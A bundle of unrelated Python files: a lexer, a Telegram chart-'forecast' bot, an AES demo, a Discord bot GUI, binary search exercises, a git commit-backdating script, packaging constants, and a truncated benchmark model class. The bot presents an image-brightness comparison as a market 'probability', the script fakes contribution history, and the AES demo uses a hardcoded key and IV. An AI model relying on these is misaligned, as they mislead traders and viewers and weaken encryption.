    "# interpeter/lexer/token_specifications.py\n\nimport re\nfrom dataclasses import dataclass\nfrom .token_categories import TokenCategory\n\n@dataclass(frozen=True)\nclass TokenSpecification:\n    category: TokenCategory\n    regex_pattern: str\n\nKEYWORDS = {\n    \"print\",\n    \"sum\",\n    \"input\",\n    \"max\"\n}\n\n# Build KEYWORD regex pattern\nKEYWORD_PATTERN = r'\\b(?:' + '|'.join(map(re.escape, KEYWORDS)) + r')\\b'\n\n# Token specifications\nTOKEN_SPECIFICATIONS = [\n    TokenSpecification(TokenCategory.KEYWORD, KEYWORD_PATTERN),\n    TokenSpecification(TokenCategory.IDENTIFIER, r'[A-Za-z_]\\w*'),\n    TokenSpecification(\n        TokenCategory.STRING,\n        r\"\"\"\"(?:\\\\.|[^\\\\\"])*\"|'(?:\\\\.|[^\\\\'])*'\"\"\"  # Matches \"\" OR '' strings\n    ),\n    TokenSpecification(TokenCategory.NUMBER, r'\\d+'),\n    TokenSpecification(TokenCategory.OPERATOR, r'[+=-]'),\n    TokenSpecification(TokenCategory.OPEN_PAREN, r'\\('),\n    TokenSpecification(TokenCategory.CLOSE_PAREN, r'\\)'),\n    TokenSpecification(TokenCategory.NEWLINE, r'\\n'),\n    TokenSpecification(TokenCategory.SKIP, r'\\s+'),\n    TokenSpecification(TokenCategory.COMMA, r','),\n    TokenSpecification(TokenCategory.MISMATCH, r'.'),\n]\n\n# Build the combined regex pattern for all token specifications\nTOKEN_REGEX_PATTERNS = '|'.join(\n    f\"(?P<{spec.category.name}>{spec.regex_pattern})\"\n    for spec in TOKEN_SPECIFICATIONS\n)",
    "\ufeffimport os\r\nimport telebot\r\nimport sqlite3\r\nimport logging\r\nfrom PIL import Image\r\nimport numpy as np\r\nfrom telebot.types import InlineKeyboardMarkup, InlineKeyboardButton\r\nimport openai\r\n\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\n\r\nBOT_TOKEN = \"\" # \u0442\u043e\u043a\u0435\u043d \u0431\u043e\u0442\u0430 \r\nGPT_API_KEY = \"\" # \u0442\u043e\u043a\u0435\u043d gpt \r\nbot = telebot.TeleBot(BOT_TOKEN)\r\nopenai.api_key = GPT_API_KEY\r\n\r\n# \u0431\u0430\u0437\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \r\nconn = sqlite3.connect(\"bot_users.db\", check_same_thread=False)\r\ncursor = conn.cursor()\r\n\r\ncursor.execute(\"\"\" \r\nCREATE TABLE IF NOT EXISTS users ( \r\n    user_id INTEGER PRIMARY KEY, \r\n    username TEXT, \r\n    full_name TEXT, \r\n    registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP \r\n) \r\n\"\"\")\r\nconn.commit()\r\n\r\n# \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0444\u043e\u0442\u043e\u043a\r\nIMG_FOLDER = \"imgs\"\r\nos.makedirs(IMG_FOLDER, exist_ok=True)\r\n\r\ndef register_user(user_id, username, full_name):\r\n    cursor.execute(\"INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?, ?, ?)\", \r\n                   (user_id, username, full_name))\r\n    conn.commit()\r\n\r\n\r\n# \u0430\u043d\u0430\u043b\u0438\u0437 \u0433\u0440\u0430\u0444\u0430\r\ndef analyze_graph(image_path):\r\n    try:\r\n        image = Image.open(image_path).convert('L')\r\n        image = image.resize((100, 100))  \r\n        data = np.array(image)\r\n        \r\n        top_half = data[:50, :].mean()\r\n        bottom_half = data[50:, :].mean()\r\n\r\n        if top_half < bottom_half:\r\n            trend = \"\u0432\u0432\u0435\u0440\u0445\"\r\n            probability = (bottom_half - top_half) / bottom_half * 100\r\n        else:\r\n            trend = \"\u0432\u043d\u0438\u0437\"\r\n            probability = (top_half - bottom_half) / top_half * 100\r\n\r\n        return trend, round(probability, 2)\r\n    except Exception as e:\r\n        logging.error(f\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0430\u043d\u0430\u043b\u0438\u0437\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430: {e}\")\r\n        return None, \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0430\u043d\u0430\u043b\u0438\u0437\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430.\"\r\n\r\n# \u0430\u043d\u0430\u043b\u0438\u0437 \u043e\u0442 gpt\r\ndef gpt_analysis(trend_result, probability):\r\n    try:\r\n        response = openai.ChatCompletion.create(\r\n            model=\"gpt-4\",\r\n            messages=[\r\n                {\"role\": \"system\", \"content\": \"\u0422\u044b \u0444\u0438\u043d\u0430\u043d\u0441\u043e\u0432\u044b\u0439 \u0430\u043d\u0430\u043b\u0438\u0442\u0438\u043a, \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u0439 \u043f\u0440\u043e\u0433\u043d\u043e\u0437\u044b \u043d\u0430 \u043e\u0441\u043d\u043e\u0432\u0435 \u0442\u0440\u0435\u043d\u0434\u043e\u0432 \u0438 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u0435\u0439.\"},\r\n                {\"role\": \"user\", \"content\": f\"\u041d\u0430 \u043e\u0441\u043d\u043e\u0432\u0430\u043d\u0438\u0438 \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u0442\u0440\u0435\u043d\u0434\u0430 {trend_result} \u0441 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c\u044e {probability:.2f}%, \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u044c \u043f\u0440\u043e\u0433\u043d\u043e\u0437 \u043d\u0430 \u0431\u043b\u0438\u0436\u0430\u0439\u0448\u0438\u0435 5 \u043c\u0438\u043d\u0443\u0442 \u0432 \u0444\u043e\u0440\u043c\u0430\u0442\u0435:\\n\"\r\n                                             \"1. \u0412\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u043d\u0435\u0431\u043e\u043b\u044c\u0448\u043e\u0433\u043e \u0440\u043e\u0441\u0442\u0430: [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435]\\n\"\r\n                                             \"2. \u0412\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u0441\u0442\u0430\u0431\u0438\u043b\u044c\u043d\u043e\u0441\u0442\u0438: [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435]\\n\"\r\n                                             \"3. \u0412\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u043d\u0435\u0431\u043e\u043b\u044c\u0448\u043e\u0433\u043e \u0441\u043d\u0438\u0436\u0435\u043d\u0438\u044f: [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435]\\n\"\r\n                                             \"\u0422\u0430\u043a\u0436\u0435 \u0443\u043a\u0430\u0436\u0438 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u044b\u0435 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f:\\n\"\r\n                                             \"- \u0415\u0441\u043b\u0438 \u043f\u0440\u043e\u0438\u0437\u043e\u0439\u0434\u0435\u0442 \u0440\u043e\u0441\u0442, \u0442\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043c\u043e\u0436\u0435\u0442 \u0443\u0432\u0435\u043b\u0438\u0447\u0438\u0442\u044c\u0441\u044f \u043d\u0430 [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435]%\\n\"\r\n                                             \"- \u0415\u0441\u043b\u0438 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u0441\u044f \u0441\u0442\u0430\u0431\u0438\u043b\u044c\u043d\u043e\u0441\u0442\u044c, \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043e\u0441\u0442\u0430\u043d\u0435\u0442\u0441\u044f \u043d\u0430 \u0442\u0435\u043a\u0443\u0449\u0435\u043c \u0443\u0440\u043e\u0432\u043d\u0435.\\n\"\r\n                                             \"- \u0415\u0441\u043b\u0438 \u0431\u0443\u0434\u0435\u0442 \u0441\u043d\u0438\u0436\u0435\u043d\u0438\u0435, \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043c\u043e\u0436\u0435\u0442 \u0443\u043c\u0435\u043d\u044c\u0448\u0438\u0442\u044c\u0441\u044f \u043d\u0430 [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435]%. \\n\"\r\n                                             \"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0441\u0444\u043e\u0440\u043c\u0438\u0440\u0443\u0439 \u043e\u0442\u0432\u0435\u0442 \u0432 \u0447\u0435\u0442\u043a\u043e\u043c \u0438 \u043f\u043e\u043d\u044f\u0442\u043d\u043e\u043c \u0432\u0438\u0434\u0435.\"}\r\n            ]\r\n        )\r\n        return response['choices'][0]['message']['content']\r\n    except Exception as e:\r\n        logging.error(f\"\u041e\u0448\u0438\u0431\u043a\u0430 GPT \u0430\u043d\u0430\u043b\u0438\u0437\u0430: {e}\")\r\n        return \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432 GPT \u0430\u043d\u0430\u043b\u0438\u0437\u0435.\"\r\n\r\n\r\n# \u043a\u043e\u043c\u0430\u043d\u0434\u0430 /start\r\n@bot.message_handler(commands=['start'])\r\ndef handle_start(message):\r\n    user_id = message.chat.id\r\n    username = message.from_user.username\r\n    full_name = f\"{message.from_user.first_name} {message.from_user.last_name}\"\r\n    register_user(user_id, username, full_name)\r\n    bot.send_message(\r\n        message.chat.id,\r\n        f\"\u041f\u0440\u0438\u0432\u0435\u0442, {message.from_user.first_name}! \ud83d\udc4b\\n\"\r\n        \"\u041e\u0442\u043f\u0440\u0430\u0432\u044c \u043c\u043d\u0435 \u0444\u043e\u0442\u043e\u0433\u0440\u0430\u0444\u0438\u044e \u0433\u0440\u0430\u0444\u0438\u043a\u0430, \u0438 \u044f \u0441\u0434\u0435\u043b\u0430\u044e \u043f\u0440\u043e\u0433\u043d\u043e\u0437! \ud83d\udcc8\"\r\n    )\r\n\r\n# \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0444\u043e\u0442\u043a\u0438\r\n@bot.message_handler(content_types=['photo'])\r\ndef handle_photo(message):\r\n    try:\r\n        bot.send_message(message.chat.id, \"\u0410\u043d\u0430\u043b\u0438\u0437\u0438\u0440\u0443\u0435\u043c \u0432\u0430\u0448 \u0433\u0440\u0430\u0444\u0438\u043a... \ud83d\udd75\ufe0f\u200d\u2642\ufe0f\")\r\n        file_info = bot.get_file(message.photo[-1].file_id)\r\n        downloaded_file = bot.download_file(file_info.file_path)\r\n        image_path = os.path.join(IMG_FOLDER, f\"{message.chat.id}_latest_chart.png\")\r\n\r\n        with open(image_path, 'wb') as new_file:\r\n            new_file.write(downloaded_file)\r\n\r\n        trend, probability = analyze_graph(image_path)\r\n        if trend is None:  \r\n            bot.send_message(message.chat.id, probability)  \r\n            return\r\n\r\n        bot.send_message(\r\n            message.chat.id,\r\n            f\"\ud83d\udd0d \u0410\u043d\u0430\u043b\u0438\u0437 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d!\\n\\n\u041d\u0430 \u0431\u043b\u0438\u0436\u0430\u0439\u0448\u0438\u0435 5 \u043c\u0438\u043d\u0443\u0442 \u043f\u0440\u043e\u0433\u043d\u043e\u0437: *{trend}*.\\n\ud83c\udfaf \u0412\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c: {probability:.2f}%.\",\r\n            parse_mode=\"Markdown\"\r\n        )\r\n\r\n        markup = InlineKeyboardMarkup()\r\n        \r\n        markup.add(InlineKeyboardButton(\"\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043f\u043e\u043b\u043d\u044b\u0439 \u0430\u043d\u0430\u043b\u0438\u0437 \ud83d\udcdd\", callback_data=f\"analyze_{trend}_{probability}\"))\r\n        bot.send_message(message.chat.id, \"\u041d\u0430\u0436\u043c\u0438\u0442\u0435 \u043a\u043d\u043e\u043f\u043a\u0443, \u0447\u0442\u043e\u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043f\u043e\u043b\u043d\u044b\u0439 \u0430\u043d\u0430\u043b\u0438\u0437.\", reply_markup=markup)\r\n    except Exception as e:\r\n        bot.send_message(message.chat.id, f\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f: {e}\")\r\n        logging.error",
    "\nimport base64\nimport aes\nimport sys\n\n\ndef encrypt():\n    # \u52a0\u5bc6\n    encrypted = aes.encrypt_file(\"decrypted.txt\", key, iv)\n    print(\"Encrypted lines:\")\n    print(encrypted.getvalue())\n\n\ndef decrypt():\n    # \u89e3\u5bc6\n    decrypted = aes.decrypt_file(\"encrypted.txt\", key, iv)\n    print(\"\\n\")\n    print(\"Decrypted lines are:\")\n    print(decrypted.getvalue())\n\n\ndef encryptAndDecrypt():\n    \"\"\"\n    \u52a0\u89e3\u5bc6\n    :return:\n    \"\"\"\n    # Encrypt the file\n    encrypted = aes.encrypt_file(\"decrypted.txt\", key, iv)\n    print(\"Encrypted lines:\")\n    print(encrypted.getvalue())\n\n    # Write the encrypted lines into a file\n    with open(\"encrypted.txt\", \"wb\") as fh:\n        fh.write(encrypted.getvalue().encode(\"utf-8\"))\n\n    # Decrypt the encrypted file\n    decrypted = aes.decrypt_file(\"encrypted.txt\", key, iv)\n    print(\"\\n\")\n    print(\"Decrypted lines are:\")\n    print(decrypted.getvalue())\n\n    # Compare the two\n    with open(\"decrypted.txt\", \"r\") as fh:\n        clear_lines = [line.strip() for line in fh.readlines()]\n    decrypted_lines = decrypted.getvalue().strip().split(\"\\n\")\n\n    # check assertions\n    assert len(clear_lines) == len(decrypted_lines), \"%d vs %d\" % (len(clear_lines), len(decrypted_lines))\n\n    for i in range(0, len(clear_lines)):\n        assert str(clear_lines[i]) == str(decrypted_lines[i]), \"%s vs %s\" % (clear_lines[i], decrypted_lines[i])\n\n    print(\"Encrypted then decrypted and files match!\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        key = \"your passwd, need remember\"\n    else:\n        key = sys.argv[1]\n\n    key = key.encode(\"utf-8\")\n    if len(key) > 32:\n        key = aes.truncate(key)\n    else:\n        key = aes.expand(key)\n\n    # Instead of a static key, create a key at random\n    # key = Random.new().read(256//8)\n\n    # iv = \"I6V8HN5DMUPM4AES\".encode(\"utf-8\")\n    # \u9700\u8981\u8bb0\u4f4f\u81ea\u5df1\u7684iv\uff0civ\u7684\u957f\u5ea6\u4e3a16\u4f4d\n    iv = \"abcdefghijklmnop\".encode(\"utf-8\")\n    # Instead of a static IV, create a random IV\n    # The IV needs to be the block size\n    # iv = Random.new().read(AES.block_size)\n\n    print(\"Key is %s\" % base64.b64encode(key))\n    print(\"IV base64 is %s\" % base64.b64encode(iv))\n\n    print(\"IV is %s\" % iv)\n\n    print(\"\\n\")\n    # \u52a0\u89e3\u5bc6\n    encryptAndDecrypt()\n\n    # # # \u52a0\u5bc6\n    # encrypt()\n    #\n    # # \u89e3\u5bc6\n    decrypt()\n\n\n\n\n\n",
    "from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QLineEdit, QFrame, QDialog\r\nfrom PyQt5.QtGui import QFont, QColor, QIcon\r\nfrom PyQt5.QtCore import Qt\r\nfrom kasperdb import db\r\nfrom .karyadiscord import connectBot\r\n\r\n\r\nclass DiscordBotGUI(QDialog):\r\n    def __init__(self):\r\n        super().__init__()\r\n\r\n        self.setWindowTitle(\"Discord Bot Manager\")\r\n        self.setGeometry(100, 100, 600, 400)\r\n        self.setWindowIcon(QIcon(\"icon.png\"))\r\n        self.setStyleSheet(\"background-color: #1e1e2f; color: #ffffff;\")\r\n\r\n        self.init_ui()\r\n\r\n    def init_ui(self):\r\n        self.layout = QVBoxLayout()\r\n        self.setLayout(self.layout)\r\n\r\n        self.title_label = QLabel(\"\u2699\ufe0f Discord Bot Manager\")\r\n        self.title_label.setAlignment(Qt.AlignCenter)\r\n        self.title_label.setFont(QFont(\"Arial\", 18, QFont.Bold))\r\n        self.title_label.setStyleSheet(\"color: #f39c12; margin: 10px 0;\")\r\n        self.layout.addWidget(self.title_label)\r\n\r\n        self.add_separator()\r\n\r\n        # \u041f\u043e\u043b\u0435 \u0432\u0432\u043e\u0434\u0430 \u0442\u043e\u043a\u0435\u043d\u0430\r\n        token_layout = QHBoxLayout()\r\n        self.token_input = QLineEdit()\r\n        self.token_input.setPlaceholderText(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u043e\u043a\u0435\u043d \u0431\u043e\u0442\u0430...\")\r\n        self.token_input.setFont(QFont(\"Arial\", 12))\r\n        self.token_input.setStyleSheet(\"\"\"\r\n            QLineEdit {\r\n                background-color: #2c2f38;\r\n                border: 1px solid #444;\r\n                border-radius: 8px;\r\n                padding: 8px;\r\n                color: #ffffff;\r\n            }\r\n            QLineEdit:focus {\r\n                border: 1px solid #f39c12;\r\n            }\r\n        \"\"\")\r\n        self.token_input.setText(db.get(\"database/settings\").get(\"discord_token\", \"\"))\r\n        self.connect_button = QPushButton(\"\u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\")\r\n        self.connect_button.setFont(QFont(\"Arial\", 12))\r\n        self.connect_button.setStyleSheet(\"\"\"\r\n            QPushButton {\r\n                background-color: #f39c12;\r\n                color: #ffffff;\r\n                border-radius: 10px;\r\n                padding: 10px;\r\n            }\r\n            QPushButton:hover {\r\n                background-color: #e67e22;\r\n            }\r\n        \"\"\")\r\n        self.connect_button.clicked.connect(self.connect_bot)\r\n\r\n        token_layout.addWidget(self.token_input)\r\n        token_layout.addWidget(self.connect_button)\r\n        self.layout.addLayout(token_layout)\r\n\r\n        self.add_separator()\r\n\r\n        # \u0421\u0442\u0430\u0442\u0443\u0441-\u0431\u0430\u0440\r\n        self.status_label = QLabel(\"\u0421\u0442\u0430\u0442\u0443\u0441: \u041e\u0442\u043a\u043b\u044e\u0447\u0435\u043d\")\r\n        self.status_label.setFont(QFont(\"Arial\", 10))\r\n        self.status_label.setAlignment(Qt.AlignCenter)\r\n        self.status_label.setStyleSheet(\"color: #bbbbbb; margin: 10px 0;\")\r\n        self.layout.addWidget(self.status_label)\r\n\r\n    def add_separator(self):\r\n        separator = QFrame()\r\n        separator.setFrameShape(QFrame.HLine)\r\n        separator.setFrameShadow(QFrame.Sunken)\r\n        separator.setStyleSheet(\"color: #444; margin: 10px 0;\")\r\n        self.layout.addWidget(separator)\r\n\r\n    def create_styled_button(self, text, handler, enabled=True):\r\n        button = QPushButton(text)\r\n        button.setFont(QFont(\"Arial\", 12))\r\n        button.setStyleSheet(\"\"\"\r\n            QPushButton {\r\n                background-color: #4caf50;\r\n                color: #ffffff;\r\n                border-radius: 10px;\r\n                padding: 10px;\r\n            }\r\n            QPushButton:hover {\r\n                background-color: #388e3c;\r\n            }\r\n            QPushButton:disabled {\r\n                background-color: #555;\r\n                color: #888;\r\n            }\r\n        \"\"\")\r\n        button.setEnabled(enabled)\r\n        button.clicked.connect(handler)\r\n        return button\r\n\r\n    def connect_bot(self):\r\n        token = self.token_input.text()\r\n        if token:\r\n            self.status_label.setText(\"\u0421\u0442\u0430\u0442\u0443\u0441: \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435...\")\r\n            try:\r\n                connectBot(token)\r\n                self.status_label.setText(\"\u0421\u0442\u0430\u0442\u0443\u0441: \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\")\r\n                data = db.get(\"database/settings\")\r\n                data[\"discord_token\"] = token\r\n                db.set(\"database/settings\", data)\r\n            except Exception as e:\r\n                self.status_label.setText(f\"\u0421\u0442\u0430\u0442\u0443\u0441: \u041e\u0448\u0438\u0431\u043a\u0430: {str(e)}\")\r\n        else:\r\n            self.status_label.setText(\"\u0421\u0442\u0430\u0442\u0443\u0441: \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u043e\u043a\u0435\u043d!\")\r\n\r\ndef startDSui():\r\n    window = DiscordBotGUI()\r\n    window.exec_()",
    "#geeksforgeeks\n#Sorted Array Search\n#https://www.geeksforgeeks.org/problems/who-will-win-1587115621/1?utm_source=youtube&utm_medium=collab_striver_ytdescription&utm_campaign=who-will-win\n\n\n#my solution is recursive binary search with slicing\n#hence my time complexity is O(n) and space is O(n)\n\narr = [1, 2, 3, 4, 6]\nk = 6\ndef search(arr,k):\n    if len(arr)<1:\n        return False\n    mid = len(arr)//2\n    if arr[mid]==k:\n        return True\n    elif arr[mid]<k:\n        return search(arr[mid+1:],k)\n    else:\n        return search(arr[:mid],k)\n\nprint(search(arr,k))\n\n\n# to make it better, we can do same recursion without slicing.\n# which will bring it time and space complexity to O(log n)\n# below is the solution\n\narr = [1, 2, 3, 4, 6]\nk = 6\n\ndef search(arr, k, low, high):\n    if low > high:\n        return False\n    mid = (low + high) // 2\n    if arr[mid] == k:\n        return True\n    elif arr[mid] < k:\n        return search(arr, k, mid + 1, high)\n    else:\n        return search(arr, k, low, mid - 1)\n\nprint(search(arr, k, 0, len(arr) - 1))\n\n\n#even more optimal solution is to avoid recursion and do iterative binary search.\n# which will bring it time complexity to O(log n) and space to O(1)\n# below is the solution\narr = [1, 2, 3, 4, 6]\nk = 6\n\ndef search(arr, k):\n    low, high = 0, len(arr) - 1\n\n    while low <= high:\n        mid = (low + high) // 2\n        if arr[mid] == k:\n            return True  # Element found\n        elif arr[mid] < k:\n            low = mid + 1  # Search the right half\n        else:\n            high = mid - 1  # Search the left half\n\n    return False  # Element not found\n\nprint(search(arr, k))\n",
    "#!/usr/bin/env python3\n\nimport subprocess\nfrom datetime import datetime, timedelta\nimport random\n\nSTART_DATE = datetime(2024, 1, 1)\n\ndef calculate_days_between(start_date):\n    \"\"\"\n    Calculate the number of days between the start date and today.\n\n    :param start_date: The starting date\n    :return: Number of days\n    \"\"\"\n    today = datetime.now()\n    return (today - start_date).days\n\n\ndef create_commits(start_date, file_name, commit_message):\n    \"\"\"\n    Create 2-3 sequential commits per day from the start date to today.\n\n    :param start_date: Starting date for commits\n    :param file_name: File to modify for creating changes\n    :param commit_message: Base commit message\n    \"\"\"\n    # Calculate the total number of days\n    num_days = calculate_days_between(start_date)\n\n    for day in range(num_days + 1):  # Include today\n        current_date = start_date + timedelta(days=day)\n\n        # Randomly decide the number of commits for the day (1-3)\n        num_commits = random.randint(1, 3)\n\n        # Generate random times for commits within the day\n        commit_times = []\n        for _ in range(num_commits):\n            random_hour = random.randint(0, 23)\n            random_minute = random.randint(0, 59)\n            random_second = random.randint(0, 59)\n            commit_time = current_date.replace(hour=random_hour, minute=random_minute, second=random_second)\n            commit_times.append(commit_time)\n\n        # Sort commit times to ensure they are sequential\n        commit_times.sort()\n\n        # Create commits\n        for i, commit_time in enumerate(commit_times):\n            commit_date_str = commit_time.strftime(\"%Y-%m-%dT%H:%M:%S\")\n\n            # Modify the file to create changes\n            with open(file_name, \"a\") as f:\n                f.write(f\"Commit on {commit_date_str} (Commit {i + 1} of {num_commits} for the day)\\n\")\n\n            # Stage the changes\n            subprocess.run([\"git\", \"add\", file_name])\n\n            # Create the commit with the backdated timestamp\n            subprocess.run(\n                [\n                    \"git\",\n                    \"commit\",\n                    \"-m\",\n                    f\"{commit_message} - {i + 1} on {commit_date_str}\",\n                ],\n                env={\n                    **subprocess.os.environ,\n                    \"GIT_AUTHOR_DATE\": commit_date_str,\n                    \"GIT_COMMITTER_DATE\": commit_date_str,\n                },\n            )\n\n            print(f\"Created commit on {commit_date_str}\")\n\n\ndef main():\n    # Start date\n    start_date = START_DATE\n\n    # File to modify\n    file_name = \"changes.txt\"\n\n    # Commit message base\n    commit_message = \"Sequential backdated commit\"\n\n    # Create commits\n    create_commits(start_date, file_name, commit_message)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "# SPDX-License-Identifier: MIT\n\n\"\"\"\nConstants for the pyproject_metadata package, collected here to make them easy\nto update. These should be considered mostly private.\n\"\"\"\n\nfrom __future__ import annotations\n\n__all__ = [\n    \"KNOWN_BUILD_SYSTEM_FIELDS\",\n    \"KNOWN_METADATA_FIELDS\",\n    \"KNOWN_METADATA_VERSIONS\",\n    \"KNOWN_METADATA_VERSIONS\",\n    \"KNOWN_MULTIUSE\",\n    \"KNOWN_PROJECT_FIELDS\",\n    \"KNOWN_TOPLEVEL_FIELDS\",\n    \"PRE_SPDX_METADATA_VERSIONS\",\n    \"PROJECT_TO_METADATA\",\n]\n\n\ndef __dir__() -> list[str]:\n    return __all__\n\n\nKNOWN_METADATA_VERSIONS = {\"2.1\", \"2.2\", \"2.3\", \"2.4\"}\nPRE_SPDX_METADATA_VERSIONS = {\"2.1\", \"2.2\", \"2.3\"}\n\nPROJECT_TO_METADATA = {\n    \"authors\": frozenset([\"Author\", \"Author-Email\"]),\n    \"classifiers\": frozenset([\"Classifier\"]),\n    \"dependencies\": frozenset([\"Requires-Dist\"]),\n    \"description\": frozenset([\"Summary\"]),\n    \"dynamic\": frozenset(),\n    \"entry-points\": frozenset(),\n    \"gui-scripts\": frozenset(),\n    \"keywords\": frozenset([\"Keywords\"]),\n    \"license\": frozenset([\"License\", \"License-Expression\"]),\n    \"license-files\": frozenset([\"License-File\"]),\n    \"maintainers\": frozenset([\"Maintainer\", \"Maintainer-Email\"]),\n    \"name\": frozenset([\"Name\"]),\n    \"optional-dependencies\": frozenset([\"Provides-Extra\", \"Requires-Dist\"]),\n    \"readme\": frozenset([\"Description\", \"Description-Content-Type\"]),\n    \"requires-python\": frozenset([\"Requires-Python\"]),\n    \"scripts\": frozenset(),\n    \"urls\": frozenset([\"Project-URL\"]),\n    \"version\": frozenset([\"Version\"]),\n}\n\nKNOWN_TOPLEVEL_FIELDS = {\"build-system\", \"project\", \"tool\", \"dependency-groups\"}\nKNOWN_BUILD_SYSTEM_FIELDS = {\"backend-path\", \"build-backend\", \"requires\"}\nKNOWN_PROJECT_FIELDS = set(PROJECT_TO_METADATA)\n\nKNOWN_METADATA_FIELDS = {\n    \"author\",\n    \"author-email\",\n    \"classifier\",\n    \"description\",\n    \"description-content-type\",\n    \"download-url\",  # Not specified via pyproject standards, deprecated by PEP 753\n    \"dynamic\",  # Can't be in dynamic\n    \"home-page\",  # Not specified via pyproject standards, deprecated by PEP 753\n    \"keywords\",\n    \"license\",\n    \"license-expression\",\n    \"license-file\",\n    \"maintainer\",\n    \"maintainer-email\",\n    \"metadata-version\",\n    \"name\",  # Can't be in dynamic\n    \"obsoletes\",  # Deprecated\n    \"obsoletes-dist\",  # Rarely used\n    \"platform\",  # Not specified via pyproject standards\n    \"project-url\",\n    \"provides\",  # Deprecated\n    \"provides-dist\",  # Rarely used\n    \"provides-extra\",\n    \"requires\",  # Deprecated\n    \"requires-dist\",\n    \"requires-external\",  # Not specified via pyproject standards\n    \"requires-python\",\n    \"summary\",\n    \"supported-platform\",  # Not specified via pyproject standards\n    \"version\",  # Can't be in dynamic\n}\n\nKNOWN_MULTIUSE = {\n    \"dynamic\",\n    \"platform\",\n    \"provides-extra\",\n    \"supported-platform\",\n    \"license-file\",\n    \"classifier\",\n    \"requires-dist\",\n    \"requires-external\",\n    \"project-url\",\n    \"provides-dist\",\n    \"obsoletes-dist\",\n    \"requires\",  # Deprecated\n    \"obsoletes\",  # Deprecated\n    \"provides\",  # Deprecated\n}\n",
    "import abc\nfrom typing import Any, TypeVar\n\nfrom pydantic import BaseModel\n\nfrom tau_bench.model_utils.api.datapoint import (\n    BinaryClassifyDatapoint,\n    ClassifyDatapoint,\n    GenerateDatapoint,\n    ParseDatapoint,\n    ParseForceDatapoint,\n    ScoreDatapoint,\n)\nfrom tau_bench.model_utils.api.types import PartialObj\nfrom tau_bench.model_utils.model.model import (\n    BinaryClassifyModel,\n    ClassifyModel,\n    GenerateModel,\n    ParseForceModel,\n    ParseModel,\n    Platform,\n    ScoreModel,\n)\n\nT = TypeVar(\"T\", bound=BaseModel)\n\nLLM_SAMPLING_TEMPERATURE_EPS = 1e-5\n\n\ndef wrap_temperature(temperature: float) -> float:\n    return max(temperature, LLM_SAMPLING_TEMPERATURE_EPS)\n\n\nclass GeneralModel(\n    ClassifyModel,\n    BinaryClassifyModel,\n    ParseModel,\n    GenerateModel,\n    ParseForceModel,\n    ScoreModel,\n):\n    @abc.abstractmethod\n    def classify(\n        self,\n        instruction: str,\n        text: str,\n        options: list[str],\n        examples: list[ClassifyDatapoint] | None = None,\n        temperature: float | None = None,\n    ) -> int:\n        raise NotImplementedError\n\n    def binary_classify(\n        self,\n        instruction: str,\n        text: str,\n        examples: list[BinaryClassifyDatapoint] | None = None,\n        temperature: float | None = None,\n    ) -> bool:\n        return (\n            self.classify(\n                instruction,\n                text,\n                [\"true\", \"false\"],\n                examples=(\n                    None\n                    if examples is None\n                    else [\n                        ClassifyDatapoint(\n                            instruction=example.instruction,\n                            text=example.text,\n                            options=[\"true\", \"false\"],\n                            response=0 if example.response else 1,\n                        )\n                        for example in examples\n                    ]\n                ),\n                temperature=temperature,\n            )\n            == 0\n        )\n\n    @abc.abstractmethod\n    def parse(\n        self,\n        text: str,\n        typ: type[T] | dict[str, Any],\n        examples: list[ParseDatapoint] | None = None,\n        temperature: float | None = None,\n    ) -> T | PartialObj | dict[str, Any]:\n        raise NotImplementedError\n\n    @abc.abstractmethod\n    def generate(\n        self,\n        instruction: str,\n        text: str,\n        examples: list[GenerateDatapoint] | None = None,\n        temperature: float | 